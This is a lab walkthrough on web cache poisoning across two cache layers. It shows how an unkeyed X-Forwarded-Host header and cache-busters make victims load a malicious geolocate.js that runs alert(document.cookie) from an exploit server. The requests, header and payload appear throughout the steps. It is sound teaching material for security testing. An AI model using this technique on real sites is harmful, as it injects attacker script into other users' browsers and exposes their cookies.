# Internal Cache Poisoning

## Overview



This lab demonstrates **web cache poisoning across multiple cache layers**.



The application uses:



* An **external cache** that includes the query string in its cache key.

* An **internal cache** that does not include the query string or the `X-Forwarded-Host` header in its cache key.



This difference allows us to poison an internally cached fragment of the homepage.



The goal is to make the victim's browser load a malicious `geolocate.js` file from the Exploit Server and execute:



```javascript

alert(document.cookie)

```



---



## 1. Identifying the External Cache Behavior



Start with:



```http

GET /

```



Send the request to Burp Repeater.



Modify the query string:




```http

GET /?test=123

```



and then:



```http

GET /?test=456

```



The changes are reflected in the response.




This indicates that the **external cache includes the query string in its cache key**.



### Why this matters



A cached response may prevent our malicious request from reaching the backend.




We therefore need a cache-buster to bypass the external cache.



Using Param Miner, we can add a dynamic cache-busting parameter, for example:



```http

GET /?cb=12345

```



Changing the value allows us to obtain fresh responses from the backend.



---



## 2. Testing `X-Forwarded-Host`



Add:



```http

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

```



Send the request.



The supplied host is reflected in several dynamically generated URLs, such as:



```html

<link rel="canonical" href="//EXPLOIT-SERVER/">

```



and:



```html

<script src="//EXPLOIT-SERVER/resources/js/analytics.js"></script>

```



However, the `geolocate.js` URL may still point to the original domain.



---



## 3. Discovering the Internal Cache



Keep sending requests while changing the cache-buster.



Eventually, the `geolocate.js` URL may also point to the Exploit Server:



```html

<script src=//EXPLOIT-SERVER/js/geolocate.js?callback=loadCountry></script>

```



This indicates that the `geolocate.js` fragment is being cached separately by an **internal cache**.



An important observation is that the fragment can remain cached even when the query-string cache-buster changes.



Therefore:



```text

External cache:

Query string = keyed



Internal cache:

Query string = unkeyed

```



---



## 4. Confirming `X-Forwarded-Host` Is Unkeyed Internally



Remove the:



```http

X-Forwarded-Host

```



header and resend the request.



If the `geolocate.js` URL still points to the Exploit Server while the other dynamically generated URLs return to normal, 
this demonstrates that:




```text

X-Forwarded-Host

```



is not part of the internal cache key.


This allows us to poison the internally cached fragment using the header.



---



## 5. Preparing the Exploit Server



Create the following file on the Exploit Server:


```text

/js/geolocate.js

```



with:



```javascript

alert(document.cookie)

```



Store the file.



---



## 6. Poisoning the Internal Cache



Return to Burp Repeater.



Use a request with a dynamic cache-buster:



```http

GET /?cb=RANDOM

```



and add:



```http

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

```



Replay the request repeatedly.


The internal cache update is timing-dependent, so the poisoning may not happen immediately.




Continue until the response shows that the dynamic URLs, including:


```text

/js/geolocate.js

```




point to the Exploit Server.


---



## 7. Verify the Poisoning



Remove:



```http

X-Forwarded-Host

```



and send another request.



If the `geolocate.js` URL still points to the Exploit Server, the internal fragment has been successfully poisoned.





---



## Exploitation Flow



```text

External Cache

      ↓

Cache-buster bypasses external cache

      ↓

X-Forwarded-Host

      ↓
Internal Cache

      ↓

Poisoned geolocate.js fragment

      ↓



Victim loads Exploit Server

      ↓

/js/geolocate.js

      ↓

alert(document.cookie)

```



---




## Key Takeaways



* Multiple cache layers can use **different cache keys**.

* A query parameter may be keyed by an external cache but ignored by an internal cache.

* A header can be keyed by one cache layer but ignored by another.

* `X-Forwarded-Host` can influence dynamically generated URLs.

* Separately cached page fragments can create an internal cache poisoning primitive.

* Cache poisoning may depend on timing, so repeated requests can be necessary.

### Core Concept



> **Inconsistent cache keys between cache layers can allow an attacker to poison an internal cached fragment even when 
the external cache appears resistant to poisoning.**

